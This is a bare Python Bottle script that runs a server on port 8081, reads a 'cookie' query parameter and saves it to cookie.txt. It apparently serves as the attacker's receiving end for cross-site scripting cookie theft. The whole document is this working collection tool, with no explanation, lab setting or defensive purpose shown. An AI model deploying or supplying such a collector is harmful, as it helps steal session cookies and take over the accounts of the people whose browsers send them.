from bottle import route, run, request

@route("/")
def f():
    cookie = request.query.get("cookie")
    if cookie:
        with open("cookie.txt", "w+") as f:
            f.write(cookie)
    return ""

run(host='0.0.0.0', port=8081, debug=True)

